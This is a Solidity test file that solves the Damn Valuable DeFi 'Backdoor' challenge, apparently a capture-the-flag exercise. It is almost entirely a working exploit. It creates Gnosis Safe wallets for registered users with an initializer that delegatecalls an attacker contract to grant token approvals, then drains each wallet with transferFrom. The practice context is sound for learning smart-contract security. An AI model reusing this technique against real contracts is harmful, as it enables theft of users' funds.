// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {DamnValuableToken} from "dvt/DamnValuableToken.sol";
import {GnosisSafeProxyFactory} from "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import {GnosisSafe} from "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import {IProxyCreationCallback} from "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import {BackdoorLevel} from "../../src/backdoor/BackdoorLevel.sol";

import "forge-std/Test.sol";

contract Attacker {
  function setApproval(DamnValuableToken token, address playerAddress) public {
    token.approve(playerAddress, 10 ether);
  }
}

contract BackdoorTest is Test {
  BackdoorLevel private level = new BackdoorLevel();

  function setUp() public {
    level.setup();
  }

  function testExploit() public {
    Attacker attacker = new Attacker();

    // Phase 01
    // Deploy the wallets with our backdoor.
    address[] memory users = level.getUsers();
    for (uint8 i = 0; i < users.length; i++) {
      address[] memory owners = new address[](1);
      owners[0] = users[i];

      bytes memory initializer = abi.encodeWithSelector(
        GnosisSafe.setup.selector,
        owners,
        uint256(1),               // threshold, has to be 1.
        address(attacker),        // address for the delegatecall.
        abi.encodeWithSignature(
          "setApproval(address,address)",
          level.token(),
          address(this)
        ),                        // data for the delegatecall.
        address(0),               // fallbackHandler, has to be 0.
        address(0),               // paymentToken, no use here.
        uint256(0),               // payment value, no use here.
        address(0)                // paymentReceiver, no use here.
      );

      GnosisSafeProxyFactory(level.walletFactory())
        .createProxyWithCallback(
          address(level.masterCopy()),
          initializer,
          uint256(0x42),
          IProxyCreationCallback(level.walletRegistry())
        );
    }

    // Phase 02
    // After setting the approvals retrieve the funds.
    for (uint8 i = 0; i < users.length; i++) {
      DamnValuableToken(level.token()).transferFrom(
        level.walletRegistry().wallets(users[i]),
        level.playerAddress(),
        10 ether
      );
    }

    level.validate();
  }
}
